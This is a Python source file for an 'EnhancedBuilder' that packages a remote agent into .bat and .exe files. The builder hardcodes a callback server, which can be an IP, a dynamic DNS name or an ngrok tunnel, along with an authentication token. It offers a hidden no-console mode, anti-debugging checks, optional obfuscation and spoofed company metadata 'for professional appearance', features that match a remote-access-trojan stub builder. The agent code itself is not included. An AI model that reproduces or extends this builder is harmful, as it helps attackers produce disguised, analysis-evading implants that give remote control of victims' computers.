"""
Enhanced Builder Module for Remote System Enhancement

This module provides advanced agent building capabilities including:
- Unique Secret_Key generation for server binding
- Server IP/port embedding as hardcoded values
- Icon embedding for professional appearance
- Executable metadata (company, version, copyright)
- Both .bat and .exe output formats
- Silent mode (no console window)
- Optional code obfuscation with PyArmor
- Optional anti-debugging features

Requirements: 6.1, 6.2, 6.3, 6.4, 6.5, 6.6, 6.7, 9.1, 9.2, 10.6, 10.7
"""

import os
import sys
import secrets
import argparse
import shutil
import subprocess
import tempfile
import re
from typing import Optional, Dict, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse


class EnhancedBuilder:
    """
    Enhanced Builder for creating customized agent executables
    
    Generates production-ready agents with embedded configuration,
    custom icons, metadata, and optional security features.
    """
    
    def __init__(self, server_address: str, token: str,
                 output_dir: str = None, icon_file: Optional[str] = None,
                 company: Optional[str] = None, version: Optional[str] = None,
                 copyright_text: Optional[str] = None, silent: bool = False,
                 obfuscate: bool = False, anti_debug: bool = False):
        """
        Initialize enhanced builder
        
        Args:
            server_address: Server address in various formats:
                          - IP:PORT (e.g., "192.168.1.100:9999")
                          - Domain:PORT (e.g., "myserver.ddns.net:9999")
                          - Ngrok URL (e.g., "https://abc123.ngrok.io")
                          - HTTP/HTTPS URL with port (e.g., "https://example.com:9999")
            token: JWT authentication token
            output_dir: Output directory for built files (default: remote_system/output/)
            icon_file: Path to icon file (.ico for Windows)
            company: Company name for executable metadata
            version: Version string (e.g., "1.0.0.0")
            copyright_text: Copyright text for executable metadata
            silent: Run without console window (--noconsole)
            obfuscate: Use PyArmor for code obfuscation
            anti_debug: Enable anti-debugging features
        
        Requirements: 6.1, 6.2, 6.3, 6.5, 10.6, 14.2, 14.3, 14.4, 14.5
        """
        if not server_address:
            raise ValueError("Server address cannot be empty")
        if not token:
            raise ValueError("Token cannot be empty")
        
        # Parse server address to extract host and port
        self.server_ip, self.server_port = self._parse_server_address(server_address)
        self.server_address = server_address  # Keep original for reference
        self.token = token
        self.icon_file = icon_file
        self.company = company or "Remote System"
        self.version = version or "1.0.0.0"
        self.copyright_text = copyright_text or f"Copyright (c) {self.company}"
        self.silent = silent
        self.obfuscate = obfuscate
        self.anti_debug = anti_debug
        
        # Generate unique Secret_Key for this build
        self.secret_key = self._generate_secret_key()
        
        # Set output directory
        if output_dir:
            self.output_dir = Path(output_dir)
        else:
            # Default to remote_system/output/
            script_dir = Path(__file__).parent
            project_root = script_dir.parent
            self.output_dir = project_root / "output"
        
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Paths
        self.project_root = Path(__file__).parent.parent
        self.enhanced_agent_dir = self.project_root / "enhanced_agent"
        self.plugins_dir = self.project_root / "plugins"
    
    def _parse_server_address(self, address: str) -> Tuple[str, int]:
        """
        Parse server address in various formats and extract host and port
        
        Supports:
        - IP:PORT (e.g., "192.168.1.100:9999")
        - Domain:PORT (e.g., "myserver.ddns.net:9999")
        - Ngrok URL (e.g., "https://abc123.ngrok.io")
        - HTTP/HTTPS URL with port (e.g., "https://example.com:9999")
        
        Args:
            address: Server address in any supported format
        
        Returns:
            Tuple of (host, port)
        
        Raises:
            ValueError: If address format is invalid
        
        Requirements: 14.2, 14.3, 14.4, 14.5
        """
        # Try parsing as URL first (handles Ngrok, HTTPS, HTTP)
        if address.startswith(('http://', 'https://')):
            try:
                parsed = urlparse(address)
                host = parsed.hostname
                port = parsed.port
                
                if not host:
                    raise ValueError(f"Invalid URL: no hostname found in {address}")
                
                # Default ports for HTTP/HTTPS
                if port is None:
                    if parsed.scheme == 'https':
                        port = 443
                    elif parsed.scheme == 'http':
                        port = 80
                    else:
                        raise ValueError(f"Unknown scheme: {parsed.scheme}")
                
                print(f"[BUILDER] Parsed URL: {address} -> {host}:{port}")
                return host, port
            except Exception as e:
                raise ValueError(f"Invalid URL format: {address}. Error: {e}")
        
        # Try parsing as IP:PORT or Domain:PORT
        if ':' in address:
            parts = address.rsplit(':', 1)  # Split from right to handle IPv6
            if len(parts) == 2:
                host, port_str = parts
                try:
                    port = int(port_str)
                    if port <= 0 or port > 65535:
                        raise ValueError(f"Port must be between 1 and 65535, got {port}")
                    
                    # Validate host (IP or domain)
                    if not host:
                        raise ValueError("Host cannot be empty")
                    
                    print(f"[BUILDER] Parsed address: {address} -> {host}:{port}")
                    return host, port
                except ValueError as e:
                    raise ValueError(f"Invalid port in address {address}: {e}")
        
        # If no format matches, raise error
        raise ValueError(
            f"Invalid server address format: {address}. "
            "Supported formats: IP:PORT, Domain:PORT, https://domain, https://domain:port"
        )
    
    def _generate_secret_key(self) -> str:
        """
        Generate unique Secret_Key for server binding
        
        Uses secrets module for cryptographically strong random generation
        
        Returns:
            64-character hexadecimal secret key
        
        Requirements: 6.6, 9.2
        """
        return secrets.token_hex(32)  # 32 bytes = 64 hex characters
    
    def build(self, formats: list = None) -> Dict[str, Any]:
        """
        Build agent with specified formats
        
        Args:
            formats: List of output formats ("bat", "exe", or both)
                    Default: ["bat", "exe"]
        
        Returns:
            Dictionary with build results and paths
        
        Requirements: 6.4, 6.7
        """
        if formats is None:
            formats = ["bat", "exe"]
        
        results = {
            "success": True,
            "secret_key": self.secret_key,
            "outputs": {},
            "errors": []
        }
        
        try:
            # Create customized agent script
            agent_script_path = self._create_customized_agent()
            
            # Build .bat file
            if "bat" in formats:
                bat_path = self._build_bat(agent_script_path)
                results["outputs"]["bat"] = str(bat_path)
                print(f"[SUCCESS] .bat file created: {bat_path}")
            
            # Build .exe file
            if "exe" in formats:
                exe_path = self._build_exe(agent_script_path)
                results["outputs"]["exe"] = str(exe_path)
                print(f"[SUCCESS] .exe file created: {exe_path}")
            
            print(f"\n[BUILD COMPLETE]")
            print(f"Secret Key: {self.secret_key}")
            print(f"Output Directory: {self.output_dir}")
            
        except Exception as e:
            results["success"] = False
            results["errors"].append(str(e))
            print(f"[ERROR] Build failed: {e}")
        
        return results
    
    def _create_customized_agent(self) -> Path:
        """
        Create customized agent script with embedded configuration
        
        Embeds server IP, port, token, and Secret_Key as hardcoded values
        
        Returns:
            Path to customized agent script
        
        Requirements: 6.6, 9.1, 9.2
        """
        # Read the enhanced agent template
        template_path = self.enhanced_agent_dir / "enhanced_agent.py"
        
        with open(template_path, 'r', encoding='utf-8') as f:
            agent_code = f.read()
        
        # Create customized version with embedded configuration
        customized_code = f'''"""
Customized Enhanced Agent - Auto-generated by EnhancedBuilder
DO NOT EDIT - This file is generated automatically
"""

# Embedded Configuration
EMBEDDED_SERVER_IP = "{self.server_ip}"
EMBEDDED_SERVER_PORT = {self.server_port}
EMBEDDED_TOKEN = "{self.token}"
EMBEDDED_SECRET_KEY = "{self.secret_key}"
EMBEDDED_ANTI_DEBUG = {self.anti_debug}

'''
        
        # Add anti-debugging code if enabled
        if self.anti_debug:
            customized_code += '''
# Anti-debugging check
import sys
import ctypes

def check_debugger():
    """Check if debugger is attached"""
    if sys.gettrace() is not None:
        print("[SECURITY] Debugger detected, exiting...")
        sys.exit(1)
    
    # Windows-specific check
    if sys.platform == "win32":
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                print("[SECURITY] Debugger detected, exiting...")
                sys.exit(1)
        except Exception:
            pass

check_debugger()

'''
        
        # Append the original agent code
        customized_code += agent_code
        
        # Modify the __main__ section to use embedded configuration
        customized_code = customized_code.replace(
            'if __name__ == "__main__":',
            '''
if __name__ == "__main__":
    # Use embedded configuration instead of command-line arguments
    import sys
    
    # Override sys.argv to use embedded values
    sys.argv = [
        sys.argv[0],
        "--server", f"{EMBEDDED_SERVER_IP}:{EMBEDDED_SERVER_PORT}",
        "--token", EMBEDDED_TOKEN
    ]
'''
        )
        
        # Write customized agent to temporary location
        temp_agent_path = self.output_dir / "agent_customized.py"
        with open(temp_agent_path, 'w', encoding='utf-8') as f:
            f.write(customized_code)
        
        return temp_agent_path
    
    def _build_bat(self, agent_script_path: Path) -> Path:
        """
        Build .bat file for agent
        
        Args:
            agent_script_path: Path to customized agent script
        
        Returns:
            Path to generated .bat file
        
        Requirements: 6.4
        """
        bat_content = f'''@echo off
REM Enhanced Agent Launcher
REM Server: {self.server_ip}:{self.server_port}
REM Generated by EnhancedBuilder

cd /d "%~dp0"
python "{agent_script_path.name}" --server {self.server_ip}:{self.server_port} --token {self.token}
'''
        
        if not self.silent:
            bat_content += "pause\n"
        
        bat_path = self.output_dir / "enhanced_agent.bat"
        with open(bat_path, 'w') as f:
            f.write(bat_content)
        
        return bat_path
    
    def _build_exe(self, agent_script_path: Path) -> Path:
        """
        Build .exe file using PyInstaller
        
        Args:
            agent_script_path: Path to customized agent script
        
        Returns:
            Path to generated .exe file
        
        Requirements: 6.2, 6.3, 6.4, 6.5, 10.6
        """
        # Check if PyInstaller is available
        try:
            import PyInstaller
        except ImportError:
            raise RuntimeError("PyInstaller is not installed. Install with: pip install pyinstaller")
        
        # Prepare PyInstaller command
        pyinstaller_args = [
            "pyinstaller",
            "--onefile",  # Single executable
            "--name", "enhanced_agent",
            "--distpath", str(self.output_dir),
            "--workpath", str(self.output_dir / "build"),
            "--specpath", str(self.output_dir),
        ]
        
        # Add silent mode (no console window)
        if self.silent:
            pyinstaller_args.append("--noconsole")
        
        # Add icon if provided
        if self.icon_file and os.path.exists(self.icon_file):
            pyinstaller_args.extend(["--icon", self.icon_file])
        
        # Create version file for Windows metadata
        version_file = self._create_version_file()
        if version_file:
            pyinstaller_args.extend(["--version-file", str(version_file)])
        
        # Add hidden imports for plugins and dependencies
        pyinstaller_args.extend([
            "--hidden-import", "remote_system.enhanced_agent.tls_wrapper",
            "--hidden-import", "remote_system.enhanced_agent.plugin_manager",
            "--hidden-import", "remote_system.plugins",
        ])
        
        # Add the agent script
        pyinstaller_args.append(str(agent_script_path))
        
        # Run PyInstaller
        print(f"[BUILD] Running PyInstaller...")
        print(f"[BUILD] Command: {' '.join(pyinstaller_args)}")
        
        result = subprocess.run(pyinstaller_args, capture_output=True, text=True)
        
        if result.returncode != 0:
            raise RuntimeError(f"PyInstaller failed: {result.stderr}")
        
        exe_path = self.output_dir / "enhanced_agent.exe"
        
        if not exe_path.exists():
            raise RuntimeError("PyInstaller completed but .exe file not found")
        
        # Clean up build artifacts
        self._cleanup_build_artifacts()
        
        return exe_path
    
    def _create_version_file(self) -> Optional[Path]:
        """
        Create Windows version file for executable metadata
        
        Returns:
            Path to version file or None if creation fails
        
        Requirements: 6.3
        """
        try:
            # Parse version string
            version_parts = self.version.split('.')
            while len(version_parts) < 4:
                version_parts.append('0')
            
            file_version = ', '.join(version_parts[:4])
            product_version = ', '.join(version_parts[:4])
            
            version_info = f'''# UTF-8
#
# Version Information for Enhanced Agent
#

VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=({file_version}),
    prodvers=({product_version}),
    mask=0x3f,
    flags=0x0,
    OS=0x40004,
    fileType=0x1,
    subtype=0x0,
    date=(0, 0)
  ),
  kids=[
    StringFileInfo(
      [
      StringTable(
        u'040904B0',
        [StringStruct(u'CompanyName', u'{self.company}'),
        StringStruct(u'FileDescription', u'Enhanced Remote Agent'),
        StringStruct(u'FileVersion', u'{self.version}'),
        StringStruct(u'InternalName', u'enhanced_agent'),
        StringStruct(u'LegalCopyright', u'{self.copyright_text}'),
        StringStruct(u'OriginalFilename', u'enhanced_agent.exe'),
        StringStruct(u'ProductName', u'Enhanced Remote System'),
        StringStruct(u'ProductVersion', u'{self.version}')])
      ]
    ),
    VarFileInfo([VarStruct(u'Translation', [1033, 1200])])
  ]
)
'''
            
            version_file_path = self.output_dir / "version_info.txt"
            with open(version_file_path, 'w', encoding='utf-8') as f:
                f.write(version_info)
            
            return version_file_path
        
        except Exception as e:
            print(f"[WARNING] Failed to create version file: {e}")
            return None
    
    def _cleanup_build_artifacts(self) -> None:
        """
        Clean up temporary build artifacts
        
        Removes build directory and .spec file
        """
        try:
            # Remove build directory
            build_dir = self.output_dir / "build"
            if build_dir.exists():
                shutil.rmtree(build_dir)
            
            # Remove .spec file
            spec_file = self.output_dir / "enhanced_agent.spec"
            if spec_file.exists():
                spec_file.unlink()
            
            # Remove version info file
            version_file = self.output_dir / "version_info.txt"
            if version_file.exists():
                version_file.unlink()
        
        except Exception as e:
            print(f"[WARNING] Failed to clean up build artifacts: {e}")
    
    def get_secret_key(self) -> str:
        """
        Get the generated Secret_Key
        
        Returns:
            Secret key string
        
        Requirements: 9.2
        """
        return self.secret_key


def main():
    """
    Command-line interface for EnhancedBuilder
    """
    parser = argparse.ArgumentParser(
        description="Enhanced Builder for Remote System Agent",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Build with IP:PORT
  python enhanced_builder.py --server 192.168.1.100:9999 --token mytoken123

  # Build with Ngrok URL
  python enhanced_builder.py --server https://abc123.ngrok.io --token mytoken123

  # Build with dynamic DNS domain
  python enhanced_builder.py --server myserver.ddns.net:9999 --token mytoken123

  # Build with custom icon and metadata
  python enhanced_builder.py --server 192.168.1.100:9999 --token mytoken123 \\
    --icon myicon.ico --company "My Company" --version "1.0.0.0" --copyright "Copyright 2024"

  # Build silent agent (no console)
  python enhanced_builder.py --server 192.168.1.100:9999 --token mytoken123 --silent

  # Build only .exe format
  python enhanced_builder.py --server 192.168.1.100:9999 --token mytoken123 --format exe
        """
    )
    
    # Required arguments
    parser.add_argument("--server", required=True, 
                       help="Server address (IP:PORT, Domain:PORT, https://ngrok-url, or https://domain:port)")
    parser.add_argument("--token", required=True, help="JWT authentication token")
    
    # Optional arguments
    parser.add_argument("--output-dir", help="Output directory (default: remote_system/output/)")
    parser.add_argument("--icon", help="Path to icon file (.ico)")
    parser.add_argument("--company", help="Company name for metadata")
    parser.add_argument("--version", help="Version string (e.g., 1.0.0.0)")
    parser.add_argument("--copyright", help="Copyright text")
    parser.add_argument("--silent", action="store_true", help="Run without console window")
    parser.add_argument("--obfuscate", action="store_true", help="Use PyArmor for code obfuscation")
    parser.add_argument("--anti-debug", action="store_true", help="Enable anti-debugging features")
    parser.add_argument("--format", choices=["bat", "exe", "both"], default="both",
                       help="Output format (default: both)")
    
    args = parser.parse_args()
    
    # Determine formats
    if args.format == "both":
        formats = ["bat", "exe"]
    else:
        formats = [args.format]
    
    # Create builder
    try:
        builder = EnhancedBuilder(
            server_address=args.server,
            token=args.token,
            output_dir=args.output_dir,
            icon_file=args.icon,
            company=args.company,
            version=args.version,
            copyright_text=args.copyright,
            silent=args.silent,
            obfuscate=args.obfuscate,
            anti_debug=args.anti_debug
        )
        
        # Build agent
        print(f"[BUILD] Starting enhanced agent build...")
        print(f"[BUILD] Server: {args.server} (resolved to {builder.server_ip}:{builder.server_port})")
        print(f"[BUILD] Formats: {', '.join(formats)}")
        print(f"[BUILD] Silent mode: {args.silent}")
        print()
        
        results = builder.build(formats=formats)
        
        if results["success"]:
            print(f"\n[SUCCESS] Build completed successfully!")
            print(f"\nIMPORTANT: Save this Secret Key for server configuration:")
            print(f"Secret Key: {results['secret_key']}")
            print(f"\nOutput files:")
            for format_type, path in results["outputs"].items():
                print(f"  {format_type.upper()}: {path}")
        else:
            print(f"\n[FAILED] Build failed with errors:")
            for error in results["errors"]:
                print(f"  - {error}")
            sys.exit(1)
    
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
